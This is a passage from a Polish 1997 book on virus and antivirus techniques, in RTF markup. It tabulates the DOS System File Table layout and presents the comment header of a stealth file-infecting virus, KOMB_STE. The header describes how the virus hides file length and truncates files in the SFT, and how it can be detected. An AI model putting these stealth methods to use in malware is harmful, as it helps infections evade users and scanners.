\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jak wida\uc1\u263\'e6, infekowanie pliku jest mo\uc1\u380\'bfliwe nawet przy jego zamykaniu. Format podtablicy SFT podano poni\uc1\u380\'bfej:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format podtablicy SFT}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.8154in/5.7731in/; table-sdh:8982658}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wska\uc1\u378\'9fnik do nast\uc1\u281\'eapnej podtablicy }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}N - liczba plik\'f3w w podtablicy }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06-40}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Opis pliku nr 1 w podtablicy - patrz nast\uc1\u281\'eapna tablica}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis pliku nr N w podtablicy}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                        }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Opis pliku zawarty w tablicy SFT}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:8984168}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Liczba \uc1\u322\'b3\uc1\u261\'b9cznik\'f3w do pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Tryb}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Atrybut pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}05-06}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Informacja o pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}07-0A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wska\uc1\u378\'9fnik do nag\uc1\u322\'b3\'f3wka programu obs\uc1\u322\'b3ugi lub do bloku DPB }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0B-0C}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Pierwsza JAP pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0D-0E}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Czas ostatniej modyfikacji pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0F-11}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Data ostatniej modyfikacji pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}11-14}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Rozmiar pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}15-18}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Aktualna pozycja wska\uc1\u378\'9fnika odczytu/zapisu pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}19-1A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wzgl\uc1\u281\'eadny numer JAP}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1B-1E}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Po\uc1\u322\'b3o\uc1\u380\'bfenie elementu katalogu opisuj\uc1\u261\'b9cego plik}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}20-2A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Nazwa i rozszerzenie pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2B-2E}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wska\uc1\u378\'9fnik do poprzedniego elementu SFT (pole programu SHARE)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2F-30}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer komputera w sieci (pole programu SHARE)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}31-32}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Adres w\uc1\u322\'b3a\uc1\u347\'9cciciela pliku (jego PSP)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}33-34}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Po\uc1\u322\'b3o\uc1\u380\'bfenie w obszarze roboczym listy zablokowanych region\'f3w p}{\f1\fs24\lang1045{\*\listtag0}liku                (pole programu SHARE)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}35-36}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer JAP }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}37-3A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wska\uc1\u378\'9fnik do IFS pliku lub 00000000h}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zamieszczony poni\uc1\u380\'bfej wirus stosuje technik\uc1\u281\'ea senii-stealth w odniesieniu do polecenia DIR i popularnych nak\uc1\u322\'b3adek oraz full stealth oparty na tablicach S}{\f1\fs24\lang1045{\*\listtag0}FT.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  KOMB_STE v1.0, Autor : Adam Blaszczyk 1997                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;      Zmodyfikowany wirus KOMBAJN, rozszerzony o technike STEALTH           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Informacje Techniczne                                                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    Wirus oszukuje uzytkownika w nastepujacy sposob :                       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;     _ Podaje prawdziwa dlugosc pliku podczas przegladania katalogu za      ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       pomoca polecenia DIR                                                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;     _ Podaje prawdziwa dlugosc pliku podczas przegladania katalogu za      ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       pomoca nakladek typu Dos Navigator, Norton Commander                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;     _ Nie pozwala przeczytac koncowej czesci pliku zawierajacej wirusa     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       (plik jest sztucznie "ucinany" w tablicy SFT )                       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    Wirus nie monitoruje odczytow z poczatku pliku, tak wiec w zarazonych   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    plikach mozna go wykryc poprzez sprawdzenie czy pierwsza instrukcja     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    programu E9 xx xx wskazuje na koniec pliku. Dodatkowo, poniewaz wirus   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    informuje o wykonywanych przez siebie operacjach - w momencie wywolania ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    zainfekowanego programu, pojawi sie od niego komunikat mowiacy o tym,   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;    iz wirus jest juz zainstalowany w pamieci.                              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
